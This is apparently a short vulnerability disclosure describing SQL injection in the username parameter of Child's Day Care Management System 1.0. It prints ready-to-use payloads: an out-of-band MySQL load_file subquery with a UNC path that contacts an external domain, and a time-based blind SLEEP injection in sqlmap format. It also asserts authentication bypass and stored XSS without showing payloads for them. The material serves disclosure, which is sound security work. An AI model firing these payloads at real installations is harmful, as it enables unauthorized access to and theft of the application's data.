## Description:
The `username` parameter from Child's Day Care Management System 1.0 appears to be vulnerable to SQL injection attacks. 
The payload '+(select load_file('\\\\3ostdw78suah84gyykzz1k9b92fv3lrcu0mncb1.nu11secur1ty.net\\ztd'))+' was submitted in the username parameter.
This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. 
The application interacted with that domain, indicating that the injected SQL query was executed. Also, this system is vulnerable to SQL-Injection-Bypass-Authentication
and XSS-Stored attacks. The attacker can be receiving all information from the system by using these vulnerabilities! Status: CRITICAL
[+] Payload:

```mysql

Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=zCAMOHlX'+(select load_file('\\\\3ostdw78suah84gyykzz1k9b92fv3lrcu0mncb1.nu11secur1ty.net\\ztd'))+'' AND (SELECT 1400 FROM (SELECT(SLEEP(5)))NgMD) AND 'wBYn'='wBYn&password=a6O!j4g!Z5
